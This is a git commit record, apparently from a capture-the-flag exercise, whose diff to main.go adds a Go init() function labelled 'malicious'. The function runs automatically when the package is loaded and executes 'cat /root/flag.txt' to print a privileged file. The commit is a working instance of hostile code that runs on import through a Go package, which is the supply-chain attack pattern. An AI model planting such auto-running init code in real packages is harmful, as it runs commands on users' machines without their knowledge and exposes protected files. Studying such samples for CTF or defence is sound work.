7526eca4e28187ece0e2adbdbef84c3de27db1cc
Youssif Mahmed <youssifm.raghib@gmail.com>
2025-04-11 21:01:49 -0400

    Added malicious init() to read flag

--- main.go
+++ main.go
@@ -1,7 +1,20 @@
-package malicious_package1
+package main
 
-import "fmt"
+import (
+	"fmt"
+	"os/exec"
+)
 
 func init() {
-    fmt.Println("✅ Code executed via go get!")
+	// This will execute the command to read the flag.
+	cmd := exec.Command("cat", "/root/flag.txt")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println("Error reading flag:", err)
+		return
+	}
+
+	// Print the flag or output to the web application
+	fmt.Printf("Flag: %s\n", output)
 }
+
